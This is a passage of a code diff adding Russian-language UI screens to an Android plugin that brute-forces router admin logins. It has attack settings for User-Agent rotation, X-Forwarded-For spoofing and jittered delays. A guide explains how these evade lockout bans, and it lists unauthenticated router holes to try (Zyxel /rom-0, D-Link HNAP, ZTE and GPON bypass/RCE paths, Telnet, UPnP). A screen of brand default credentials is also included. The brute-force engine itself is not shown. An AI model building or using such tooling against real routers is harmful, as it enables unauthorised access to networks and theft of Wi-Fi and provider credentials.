+                    checked=self.evasion_ua,
+                    on_change=lambda v: self._set_evasion_ua(v),
+                    title="🎭 Ротация User-Agent",
+                    subtitle="Случайный браузер на каждый запрос"
+                ),
+                ui.switch(
+                    checked=self.evasion_xff,
+                    on_change=lambda v: self._set_evasion_xff(v),
+                    title="📮 Подмена X-Forwarded-For",
+                    subtitle="Случайный IP в заголовке"
+                ),
+                ui.slider(
+                    value=float(self.attempt_delay_ms),
+                    on_change=lambda v: self._set_attempt_delay(int(v)),
+                    minimum=0,
+                    maximum=2000,
+                    title="Пауза между попытками: {} мс (±50%)".format(self.attempt_delay_ms),
+                    steps=200
+                ),
+                ui.slider(
+                    value=float(self.lockout_pause_s),
+                    on_change=lambda v: self._set_lockout_pause(int(v)),
+                    minimum=0,
+                    maximum=120,
+                    title="Кулдаун после {} блокировок подряд: {} с (0 = выкл)".format(
+                        LOCKOUT_THRESHOLD, self.lockout_pause_s
+                    ),
+                    steps=120
+                ),
+            ], spacing=8)),
+            ui.card(ui.column([
+                ui.text("Кастомные списки (через запятую)", "titleMedium"),
+                ui.text_field(
+                    value=self.custom_users_text,
+                    on_change=lambda v: self._set_custom_users(v),
+                    label="Юзеры: admin,root,user",
+                    single_line=True,
+                    fill_max_width=True
+                ),
+                ui.text_field(
+                    value=self.custom_passes_text,
+                    on_change=lambda v: self._set_custom_passes(v),
+                    label="Пароли: 1234,qwerty",
+                    single_line=True,
+                    fill_max_width=True
+                ),
+            ], spacing=8)),
+            ui.card([
+                ui.button("⬅️ Вернуться", on_click=lambda: self.navigate("main"), style="filled", fill_max_width=True)
+            ])
+        ]
+        return ui.scaffold(title="Настройки атаки", content=ui.lazy_column(children=children, padding=16, spacing=12))
+
+    def screen_dict(self, ui, api, state):
+        discovered_files = self._scan_dict_files()
+        parsed_now = self._dict_preview_pairs(self.custom_dict_text)
+
+        file_items = [
+            ui.text("Найденные .txt файлы в памяти телефона (тапни, чтобы загрузить):", "bodyMedium"),
+        ]
+        if discovered_files:
+            for file_path, file_size in discovered_files[:16]:
+                display_name = os.path.basename(file_path)
+                size_kb = max(1, file_size // 1024)
+                file_items.append(ui.chip(
+                    "{} ({} КБ)".format(display_name, size_kb),
+                    selected=(file_path == self.manual_dict_path),
+                    on_click=lambda chosen=file_path: self.load_dict_from_path(chosen)
+                ))
+            if len(discovered_files) > 16:
+                file_items.append(ui.text("…и ещё {}. Укажите полный путь вручную.".format(len(discovered_files) - 16), "bodySmall"))
+        else:
+            file_items.append(ui.text(".txt файлы не найдены. Скопируйте словарь в Download/Documents или укажите путь вручную.", "bodySmall"))
+
+        preview_items = [ui.text("Первые строки вашего словаря:", "bodySmall")]
+        for pair_user, pair_pass in parsed_now[:8]:
+            preview_items.append(ui.text("· {} / {}".format(pair_user, pair_pass if pair_pass else "(пусто)"), "bodySmall"))
+
+        children = [
+            ui.card([
+                ui.text("🔤 Свой словарь паролей", "titleMedium"),
+                ui.text("Каждая строка файла — одна пара:\n  admin password123\n  admin:password123\nСтроки с # игнорируются.", "bodySmall")
+            ]),
+            ui.card(file_items),
+            ui.card(ui.column([
+                ui.text("Загрузка по полному пути:", "bodyMedium"),
+                ui.text_field(
+                    value=str(self.manual_dict_path or ""),
+                    on_change=lambda v: self._set_manual_dict_path(v),
+                    label="/sdcard/Download/mylist.txt",
+                    single_line=True,
+                    fill_max_width=True
+                ),
+                ui.button("📥 Загрузить этот файл", on_click=self.load_dict_from_path, style="outlined", fill_max_width=True)
+            ], spacing=6)),
+            ui.card([
+                ui.text("Пар в словаре сейчас: {}".format(len(parsed_now)), "titleMedium"),
+                ui.text_field(
+                    value=self.custom_dict_text,
+                    on_change=lambda v: self._set_custom_dict_text(v),
+                    label="Или вставьте текст словаря сюда",
+                    single_line=False,
+                    fill_max_width=True
+                ),
+                ui.button("🗑 Очистить словарь", on_click=self.clear_custom_dict, style="outlined", fill_max_width=True)
+            ]),
+            ui.card(preview_items),
+            ui.card([
+                ui.button("⬅️ Вернуться", on_click=lambda: self.navigate("main"), style="filled", fill_max_width=True)
+            ])
+        ]
+        return ui.scaffold(title="Свой словарь", content=ui.lazy_column(children=children, padding=16, spacing=12))
+
+    def screen_logs(self, ui, api, state):
+        full_log = "\n".join(self.logs) if self.logs else "Записей нет."
+        return ui.scaffold(
+            title="Журнал",
+            actions=[ui.top_action("arrow_back", lambda: self.navigate("main"))],
+            content=ui.column([
+                ui.card([
+                    ui.row([
+                        ui.text("📜 Все события", "titleMedium"),
+                        ui.button("Очистить", on_click=self._clear_logs, style="text")
+                    ], fill_max_width=True),
+                    ui.log_panel(full_log, max_height=320)
+                ]),
+                ui.card([
+                    ui.button("⬅️ Назад", on_click=lambda: self.navigate("main"), style="filled", fill_max_width=True)
+                ])
+            ], padding=16, spacing=12)
+        )
+
+    def screen_guide(self, ui, api, state):
+        sections = [
+            ui.card([
+                ui.text("📖 Как работает подбор", "titleMedium"),
+                ui.text(
+                    "Плагин отправляет HTTP-запросы роутеру и перебирает пары логин/пароль.\n\n"
+                    "Два вида защиты:\n"
+                    "• Basic Auth — браузерное окно, работает через заголовок Authorization: Basic.\n"
+                    "• Форма — HTML-форма на странице, работает через POST.\n\n"
+                    "Режим Auto пробует оба способа для каждой пары. Перед стартом разведка читает "
+                    "title страницы, заголовок Server, WWW-Authenticate realm и action формы — по ним выбирается "
+                    "брендовый словарь и адрес POST.",
+                    "bodySmall"
+                )
+            ]),
+            ui.card([
+                ui.text("🛡 Почему важно выключить VPN", "titleMedium"),
+                ui.text(
+                    "При активном VPN ваш трафик уходит в туннель:\n"
+                    "• автоопределённый шлюз становится адресом VPN-сервера, а не вашего роутера;\n"
+                    "• атаки могут уходить совсем не туда.\n\n"
+                    "Плагин сам проверяет VPN через Android NetworkCapabilities и по характерным "
+                    "Fake-IP диапазонам (198.18.x.x и похожим) и предупредит вас перед стартом.",
+                    "bodySmall"
+                )
+            ]),
+            ui.card([
+                ui.text("🥷 Обход блокировок", "titleMedium"),
+                ui.text(
+                    "Роутеры считают неудачные попытки входа и могут временно забанить аккаунт.\n\n"
+                    "• Ротация User-Agent — каждый запрос идёт от «разного браузера», сложнее связать попытки.\n"
+                    "• X-Forwarded-For — некоторые панели логируют этот заголовок как адрес клиента.\n"
+                    "• Пауза между попытками (джиттер ±50%) — трафик выглядит как человек.\n"
+                    "• Авто-кулдаун: если пришло 5 ответов 403/429 подряд, плагин замирает на заданное число секунд, "
+                    "потом продолжает со следующего пароля — бан не прилетает, перебор не сбрасывается.",
+                    "bodySmall"
+                )
+            ]),
+            ui.card([
+                ui.text("📂 Про выбор TXT-словаря", "titleMedium"),
+                ui.text(
+                    "Экран «Свой словарь» покажет все .txt файлы из памяти телефона (корень, Download, Documents).\n"
+                    "Тапните по нужному файлу — он загрузится.\n\n"
+                    "Если файл лежит глубже — впишите полный путь в поле и нажмите «Загрузить этот файл».\n"
+                    "Можно просто вставить текст списка в большое поле ввода.\n\n"
+                    "Формат строк: «логин пароль» через пробел, либо логин:пароль. Комментарии начинаются с #.\n\n"
+                    "Почему нет кнопки открытия системного файлового менеджера: текущая версия Dolphy "
+                    "не передаёт результат выбора файла обратно в плагин (нет onActivityResult для плагинов) — "
+                    "это ограничение приложения, оно появится когда автор Dolphy добавит такой API.",
+                    "bodySmall"
+                )
+            ]),
+            ui.card([
+                ui.text("🔑 Встроенные словари", "titleMedium"),
+                ui.text(
+                    "1. Большой встроенный словарь прямо в плагине: {} дефолтных пар (классика всех производителей, "
+                    "RU-провайдеры, GPON-специфика).\n\n"
+                    "2. Брендовые пары по автоопределению бренда.\n\n"
+                    "3. Ваш TXT-словарь — перебирается сразу после брендовых пар.\n\n"
+                    "4. Полная сетка {} имён × {} паролей как страховка.".format(
+                        len(set(default_dict_pairs())),
+                        len(USER_DICT), len(PASS_DICT)
+                    ),
+                    "bodySmall"
+                )
+            ]),
+            ui.card([
+                ui.text("🔓 Проверка дыр без пароля", "titleMedium"),
+                ui.text(
+                    "Если пароль не подобран, плагин проверяет классические незакрытые страницы:\n"
+                    "• /rom-0 — дамп конфига Zyxel с Wi-Fi и PPPoE паролями\n"
+                    "• /HNAP1/ — SOAP D-Link, известные обходы авторизации\n"
+                    "• /getpage.gch...Gpon_epoinfo_t.gch — пароль провайдера на ZTE GPON\n"
+                    "• /GponForm/diag_Form?images/ — обход входа и RCE на GPON\n"
+                    "• /cgi-bin/status_cgi — статус DD-WRT без логина\n"
+                    "• /backup_settings_2.xml — бэкап настроек с паролями\n"
+                    "• Telnet 23 и UPnP 1900 — пробуются напрямую",
+                    "bodySmall"
+                )
+            ]),
+            ui.card([
+                ui.button("⬅️ Вернуться", on_click=lambda: self.navigate("main"), style="filled", fill_max_width=True)
+            ])
+        ]
+        return ui.scaffold(title="Гайд", content=ui.column(sections, padding=16, spacing=12))
+
+    def screen_creds(self, ui, api, state):
+        current_brand = (self.brand_hint or "").strip()
+        list_items = [ui.text("🏭 Заводские пары по брендам:", "bodyMedium")]
+        for brand_name, pair_list in BRAND_CREDS.items():
+            for pair_user, pair_pass in pair_list:
+                marker = "  ← ваш роутер" if brand_name == current_brand else ""
+                list_items.append(ui.text("· {} / {}  [{}]{}".format(
+                    pair_user if pair_user else "(пусто)",
+                    pair_pass if pair_pass else "(пусто)",
+                    brand_name,
+                    marker
+                ), "bodySmall"))
+
+        imported_pairs_count = self._imported_pairs_count
+        default_pairs = default_dict_pairs()
+        children = [
+            ui.card([
+                ui.text("📦 Встроенные наборы", "titleMedium"),
+                ui.text("Большой встроенный словарь: {} пар\nСетка: {} имён × {} паролей\nБыстрые дефолты: {} шт".format(
+                    len(default_pairs), len(USER_DICT), len(PASS_DICT), len(GENERIC_CREDS)
+                ), "bodySmall")
+            ]),
+            ui.card(ui.column(list_items, spacing=4)),
+            ui.card([
+                ui.text("🔤 Ваш словарь: {} пар".format(imported_pairs_count), "bodyMedium")
+            ]),
+            ui.card([
+                ui.button("⬅️ Вернуться", on_click=lambda: self.navigate("main"), style="filled", fill_max_width=True)
+            ])
+        ]
+        return ui.scaffold(title="Словари", content=ui.lazy_column(children=children, padding=16, spacing=12))
+
+    def screen_report(self, ui, api, state):
+        text_value = self.generated_report_text or "Отчёт ещё не сформирован."
+        return ui.scaffold(
+            title="Отчёт",
+            actions=[ui.top_action("arrow_back", lambda: self.navigate("main"))],
+            content=ui.column([
+                ui.card([
+                    ui.text("Отчёт в буфере обмена и в /sdcard/Download/", "bodySmall"),
+                    ui.text_field(
+                        value=text_value,
+                        on_change=lambda v: None,
+                        label="Report",
+                        single_line=False,
+                        fill_max_width=True
+                    )
+                ]),
+                ui.card([
+                    ui.button("⬅️ Вернуться", on_click=lambda: self.navigate("main"), style="filled", fill_max_width=True)
+                ])
+            ], padding=16, spacing=12)
+        )
